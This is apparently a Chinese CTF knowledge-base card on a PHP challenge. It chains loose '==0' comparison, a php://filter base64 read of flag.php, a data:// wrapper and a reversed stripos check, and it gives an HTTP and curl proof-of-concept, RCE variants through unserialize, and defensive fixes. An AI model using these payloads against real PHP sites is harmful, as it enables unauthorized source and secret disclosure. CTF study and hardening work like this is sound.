---
id: ctf-web-php-weak-compare-php-filter-data-wrapper
title: PHP 弱比较 + php://filter 读源码：==0 绕过、data:// 满足内容校验与 stripos 参数顺序
type: scenario
domain: ctf
path: ctf/web
technique: php-loose-compare-php-filter-data-wrapper
tags:
- ctf
- web
- php
- type-juggling
- php-filter
- data-wrapper
- source-disclosure
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V216
  verified_at: '2026-11-07T04:44:40+08:00'
  notes: 已对照原文 Code 与图19/20/21核对：三重条件、php://filter base64 读 flag.php、data://text/plain;base64,V2VsY29tZSE=、stripos("flag.php",input1) 参数顺序、input3=i:0; 占位均一致；PHP 8 下 ==0 语义变化说明正确；响应base64解码得flag.php源码与flag。未验证点：未对题目环境复跑；allow_url_fopen/PHP版本以题目为准；frontmatter无sources/source_url。dup-scan pair 9 与18956 resource校验绕过卡触发不同，均保留。
url: /docs/ctf/web/ctf-web-php-weak-compare-php-filter-data-wrapper/
draft: false
kb_aliases:
- Code
- PHP 弱类型 ==0
- php://filter base64 读源码
- data://text/plain
- stripos 参数顺序
- file_get_contents 包装器
---

## 一句话结论

当入口用 `$input1 == 0`、`file_get_contents($input2) == "Welcome!" && $input2 == 0` 和 `stripos("flag.php", $input1) === false` 组合校验时，把 `input1` 设为 `php://filter/read=convert.base64-encode/resource=flag.php`（非数字开头，转数字为 0，且不是 `"flag.php"` 的子串），把 `input2` 设为 `data://text/plain;base64,V2VsY29tZSE=`（内容为 `Welcome!`，转数字也是 0），即可让 `file_get_contents($input1)` 输出 flag.php 的 Base64 源码。

## 原理

- **弱比较 `==0`**：PHP 8 之前的字符串与数字比较会把字符串转成数字；以字母开头的字符串（`php://...`、`data://...`）转数字结果是 0，因此 `"php://filter..." == 0` 为 true。PHP 8 改为“数字转字符串再比较”，`0 == "php://..."` 为 false，这条链在 PHP 8 上失效。
- **内容校验**：`file_get_contents` 支持 URL 包装器；`data://text/plain;base64,V2VsY29tZSE=` 返回 `Welcome!`，满足 `== "Welcome!"`；同时它的字符串转数字为 0，满足第二个 `== 0`。
- **参数顺序陷阱**：`stripos("flag.php", $input1)` 的 haystack 是 `"flag.php"`、needle 是 `$input1`。`$input1` 是 `php://...`，不是 `"flag.php"` 的子串，返回 false，`=== false` 成立。如果写成 `stripos($input1, "flag.php")`，就会在输入串里找 `"flag.php"`，反而可能命中。
- **读源码**：`php://filter/read=convert.base64-encode/resource=flag.php` 让 PHP 以 Base64 编码读取 flag.php 的内容并输出，避免被当作 PHP 执行；响应中的 Base64 解码即得源码/flag。
- `unserialize($input3); $variable();` 是后续的可调用入口，但 flag 在它之前已经 echo 输出；传 `i:0;` 只会让 `0()` 报错，不影响回显。如果 flag 不在源码里，才需要利用这个入口构造 POP/任意函数调用。

## 触发条件

- 目标使用 PHP 7.x 或更早版本（PHP 8 的 `==` 语义会破坏 `==0` 绕过）。
- `input1`、`input2` 未做类型/包装器白名单校验，`file_get_contents` 直接接受用户输入。
- `stripos` 的参数顺序为 `stripos("flag.php", $input1)` 且未用 `!== false` 正确判断。
- `php://filter` 与 `data://` 包装器未被 `disable_functions`/`allow_url_fopen` 等配置禁用（`php://filter` 通常始终可用，`data://` 需要 `allow_url_fopen`）。

## 利用步骤

1. 读源码确认三个条件与 `stripos` 参数顺序。
2. 构造 `input1=php://filter/read=convert.base64-encode/resource=flag.php`；验证 `"php://..." == 0` 为 true（PHP 7）。
3. 构造 `input2=data://text/plain;base64,V2VsY29tZSE=`；验证 `file_get_contents(input2) == "Welcome!"` 且 `input2 == 0`。
4. `input3` 可传 `i:0;` 占位，或按后续 `$variable()` 构造可调用对象/函数名。
5. 发送请求，取响应中的 Base64 串解码，得到 flag.php 源码与 flag。

## PoC

```http
GET /?input1=php://filter/read=convert.base64-encode/resource=flag.php&input2=data://text/plain;base64,V2VsY29tZSE=&input3=i:0; HTTP/1.1
Host: target
```

```bash
# 若 input1 直接回显 Base64
curl -s 'http://target/?input1=php://filter/read=convert.base64-encode/resource=flag.php&input2=data://text/plain;base64,V2VsY29tZSE=&input3=i:0;' \
  | sed -n 's/.*\([A-Za-z0-9+/=]\{40,\}\).*/\1/p' | base64 -d
```

## 变体与关联

- 变体：`input1` 用 `php://filter/convert.base64-encode/resource=index.php` 读其他源码；`input2` 用 `data://text/plain,Welcome!`（无 Base64）或 `php://input` + POST body。
- 变体：若 `input3` 才是真正入口，可配合 `unserialize` POP 链、`__invoke`/`__call` 或内置函数名（如 `system`）实现 RCE。
- 变体：PHP 8 下 `==0` 失效，但 `file_get_contents` + `stripos` 参数顺序问题仍可能存在，可改用数组/类型混淆或其他弱比较点。
- 关联：[[web-php-deserialization-double-md5-weak-compare-pop-chain]]（PHP 弱比较 + POP 链）、[[web-php-file-inclusion-filter-chain-fileless-rce]]（php://filter 链式利用）、[[ctf-web-unsigned-role-cookie-md5-magic-hash-ssrf-loopback]]（CTF 弱比较/魔术哈希）。
- 边界：`allow_url_fopen=Off` 时 `data://` 不可用；`php://filter` 读不到 open_basedir 之外的文件；flag 可能在数据库/环境变量而非源码中。

## 检测与防御

- **检测（CTF）**：参数中出现 `php://filter`、`data://`、`resource=`、`convert.base64-encode`；响应出现大段 Base64；`stripos` 参数顺序写反。
- **修复（真实代码）**：用 `===`/`hash_equals` 做严格比较；对输入做类型与白名单校验，禁止包装器；`file_get_contents` 的文件路径使用固定白名单/映射表，不接受用户输入。
- **加固**：关闭 `allow_url_fopen`/`allow_url_include`；`open_basedir` 限制；WAF 拦截 `php://`/`data://` 关键字；不要在源码中直接存放 flag。
